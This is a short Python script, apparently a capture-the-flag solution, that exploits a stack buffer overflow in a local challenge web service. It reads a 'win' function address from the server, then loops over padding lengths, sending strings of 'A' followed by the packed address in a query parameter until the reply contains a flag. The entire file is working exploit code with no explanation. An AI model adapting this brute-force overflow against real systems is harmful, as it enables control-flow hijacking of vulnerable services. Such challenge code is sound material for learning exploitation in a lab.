import urllib.parse
import requests
import sys
import time

def get_win_address(path):

    url = f"http://challenge.localhost/{path}"
    win_address = requests.request(method = "GET", url = url).text

    return win_address

def gen_ran_bytes(times):

    random_bytes = "A" * times

    return random_bytes

def smash_the_stack(path, win_address, random_bytes):

    payload = random_bytes + win_address
    print("Smashing the stack ...\n")

    params = {"name": payload}
    url = f"http://challenge.localhost/{path}"
    flag = requests.request(method = "GET", url = url, params = params).text

    return flag

def main():

    if len(sys.argv) < 2:
        print("\nNo parameter provided!")
        print("Syntax: python3 request.py [LOCATION]")
        print("Aborting ...\n")
        exit(1)

    path = "win_address"
    win_address = get_win_address(path)
    win_address = win_address.strip()
    win_address = int(win_address, 16).to_bytes(8, byteorder='little')
    win_address = win_address.decode('latin')

    location = int(sys.argv[1])
    path = "greet"
    
    for times in range(location, 10000):
        print(f"Counter: {times}")
        random_bytes = gen_ran_bytes(times)
        flag = smash_the_stack(path, win_address, random_bytes)
        
        if "flag" in flag:
            print(flag)
            exit(0)
        time.sleep(0.5)

if __name__ == "__main__":
    main()
